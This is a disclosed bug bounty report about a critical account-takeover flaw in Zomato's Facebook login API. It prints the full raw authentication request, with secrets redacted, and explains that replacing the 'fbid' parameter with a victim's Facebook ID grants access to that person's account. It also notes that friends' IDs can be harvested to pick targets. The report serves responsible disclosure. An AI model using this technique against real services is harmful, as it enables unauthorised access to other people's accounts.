# Unauthorised Access to Anyone's User Account

## Report Details
- **Report ID**: 202921
- **URL**: https://hackerone.com/reports/202921
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2017-02-02T15:33:35.634Z
- **Disclosed**: 2017-03-28T22:13:53.396Z

## Reporter
- **Username**: bhavukjain1
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
When we do Login with Facebook on the Zomato app, you're doing zero authentication of the user. I'm able to hack into the targeted user's accounts by just using the Facebook ID.

Affected API raw request:

POST /v2/auth.json?presentlat=28.66505699180115&useragent=model_iPod%20touch__os_9.3.5__v_7.0__t_iPod5,1&app_version=7.0&session_id=41&app_run_id=21&presentlon=77.32215271029096&lang=en&push_permission=1&isFacebook=true&channel_url=&uuid=█████████ HTTP/1.1
Host: 1api.zomato.com
Accept-Language: en-IN;q=1, nl-IN;q=0.9, it-IN;q=0.8, de-IN;q=0.7, fr-IN;q=0.6
Accept: */*
User-Agent: Zomato/6.6.9 (iPod touch; iOS 9.3.5; Scale/2.00)
X-Zomato-API-Key: █████████
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: keep-alive
app_version: 7.0
Cookie: PHPSESSID=██████████; fbcity=1; fbtrack=c9bce885893ad8387ae3dc855d6f5b97; zl=en
Content-Length: 984
Accept-Encoding: gzip

access_token=&client_id=zomato_ios_v2&fb_permission=%5B%22user_friends%22%2C%22email%22%2C%22contact_email%22%2C%22public_profile%22%5D&fb_token=████████&fbdata=%7B%0A%20%20%22link%22%20%3A%20%22https%3A%5C%2F%5C%2Fwww.facebook.com%5C%2Fapp_scoped_user_id%5C%2F█████%5C%2F%22%2C%0A%20%20%22id%22%20%3A%20%22██████████%22%2C%0A%20%20%22first_name%22%20%3A%20%22Bhavuk%22%2C%0A%20%20%22name%22%20%3A%20%22Bhavuk%20Jain%22%2C%0A%20%20%22gender%22%20%3A%20%22male%22%2C%0A%20%20%22last_name%22%20%3A%20%22Jain%22%2C%0A%20%20%22email%22%20%3A%20%22█████████%40yahoo.co.in%22%2C%0A%20%20%22locale%22%20%3A%20%22en_US%22%2C%0A%20%20%22timezone%22%20%3A%205.5%2C%0A%20%20%22updated_time%22%20%3A%20%222016-12-24T21%3A55%3A30%2B0000%22%2C%0A%20%20%22verified%22%20%3A%20true%0A%7D&fbid=█████

In the last parameter, "fbid", I just need to replace it with the targeted user's facebook id, and I've been given the access to that user account. 
For eg, just replace the "fbid" parameter with ███. You'll gain the access to this user's account.

Also, using my Facebook access token, I'm able to get the correct facebook ids of the people I'm friends on Facebook with and also the ids of second degree friends as well. So I'm able to hack into their Zomato accounts with ease.

## Attachments
No attachments
